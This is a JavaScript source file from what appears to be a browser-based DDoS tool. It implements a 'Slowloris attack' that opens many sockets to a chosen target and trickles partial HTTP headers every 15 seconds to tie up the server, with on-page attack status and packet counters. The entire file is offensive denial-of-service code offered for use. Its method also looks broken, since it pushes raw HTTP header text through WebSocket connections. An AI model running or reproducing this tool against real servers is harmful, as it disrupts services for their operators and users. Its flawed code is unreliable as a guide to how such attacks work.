// public/main/ddos/slowloris.js
function slowloris(target, numSockets) {
    if (!target) {
        console.error("Target URL is required.");
        updateStatus("Target URL is required.", "red");
        return;
    }

    try {
        const parsedTarget = new URL(target);
        const hostname = parsedTarget.hostname;
        const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
        const isSecure = parsedTarget.protocol === 'https:';
        const path = parsedTarget.pathname || "/";

        if (!numSockets || numSockets <= 0) {
            numSockets = 200;
        }

        updateStatus(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`, "yellow");
        console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);

        let socketsOpen = 0;
        let packetsSent = 0;
        let startTime = Date.now();

        for (let i = 0; i < numSockets; i++) {
            createSocket(hostname, port, i, isSecure, path);
        }

        function createSocket(hostname, port, index, isSecure, path) {
            let socket;
            try {
                const protocol = isSecure ? 'wss://' : 'ws://';
                socket = new WebSocket(`${protocol}${hostname}:${port}${path}`);

                socket.onopen = () => {
                    socketsOpen++;
                    console.log(`Socket ${index + 1} opened.`);
                    updateStatus(`Socket ${index + 1} opened. Sockets Open: ${socketsOpen}`, "green");
                    sendInitialHeader(socket, hostname);
                    setInterval(() => {
                        sendKeepAliveHeader(socket);
                    }, 15000);
                };

                socket.onclose = () => {
                    socketsOpen--;
                    console.log(`Socket ${index + 1} closed.`);
                    updateStatus(`Socket ${index + 1} closed. Sockets Open: ${socketsOpen}`, "red");
                };

                socket.onerror = (error) => {
                    console.error(`Socket ${index + 1} error: ${error.message}`);
                    updateStatus(`Socket ${index + 1} error: ${error.message}`, "red");
                    socketsOpen--;
                    try {
                        if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
                            socket.close();
                        }
                    } catch (closeError) {
                        console.error(`Error closing socket ${index + 1}:`, closeError.message);
                    }
                };
            } catch (socketError) {
                console.error(`Error creating socket ${index + 1}:`, socketError.message);
                updateStatus(`Error creating socket ${index + 1}: ${socketError.message}`, "red");
            }
        }

        function sendInitialHeader(socket, hostname) {
            const initialHeader = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n`;
            try {
                socket.send(initialHeader);
                packetsSent++;
                updateStats(packetsSent, startTime);
            } catch (error) {
                console.error("Error sending initial header:", error.message);
                updateStatus(`Error sending initial header: ${error.message}`, "red");
                try {
                    if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
                        socket.close();
                    }
                } catch (closeError) {
                    console.error("Error closing socket after send error:", closeError.message);
                }
            }
        }

        function sendKeepAliveHeader(socket) {
            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
            try {
                socket.send(keepAliveHeader);
                packetsSent++;
                updateStats(packetsSent, startTime);
            } catch (error) {
                console.error("Error sending keep-alive header:", error.message);
                updateStatus(`Error sending keep-alive header: ${error.message}`, "red");
                try {
                    if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
                        socket.close();
                    }
                } catch (closeError) {
                    console.error("Error closing socket after send error:", closeError.message);
                }
            }
        }

        function updateStats(packetsSent, startTime) {
            let elapsedTime = (Date.now() - startTime) / 1000;
            document.getElementById('packetsSent').innerText = `Packets Sent: ${packetsSent}`;
            document.getElementById('timeElapsed').innerText = `Time Elapsed: ${elapsedTime.toFixed(2)} seconds`;
        }

        function updateStatus(message, color) {
            const statusElement = document.getElementById('attackStatus');
            if (statusElement) {
                statusElement.innerText = message;
                statusElement.style.color = color;
            }
        }


    } catch (error) {
        console.error("Error during Slowloris setup:", error.message);
        updateStatus(`Error during Slowloris setup: ${error.message}`, "red");
    }
}